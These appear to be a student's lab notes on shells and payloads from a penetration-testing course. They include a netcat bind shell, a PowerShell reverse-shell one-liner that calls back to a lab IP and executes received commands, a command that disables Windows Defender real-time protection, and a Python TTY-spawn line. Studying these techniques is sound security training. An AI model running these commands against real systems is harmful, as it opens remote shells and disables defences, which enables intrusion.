
- Direct access to the **underlying os** and **commands** and **file system**

- Persistence on a system
#### Payloads deliver shells

- Networking
	>Encapsulated data portion of a packet
- Basic omputing
	 >portion of an instruction that defines the action taken
- Programming
	> data referenced or carried by he language
- Exploitation & security
	>Payload is code crafted with intent to exploit
	

### Basic bind shell with NC

#### No. 1: Server - Binding a Bash shell to the TCP session

```BASH
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

#### Q1 : 443
#### q2 : 

ssh to target
[[Why get shells#Basic bind shell with NC]]

### Reverse shell

on client (target)

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

-> Windows defnededf blocks this exectuion so we neeed to disable it for test purposes
#### Disable AV

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Automating Payloads & Delivery with Metasploit


### Staged vs. Stageless Payloads

#### Staged
>dont send the whole payload immediatley, sets a stage and then calls back to download the rest of the payload

#### Stageless
>sent in entirety across the network, better for low bandwith enviroments

## Executing a Stageless Payload


# using shells

Use `CMD` when:

- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.

## Spawning a TTY Shell with Python

```
which python
```

#### interactive python shell

```shell
python -c 'import pty; pty.spawn("/bin/sh")' 
```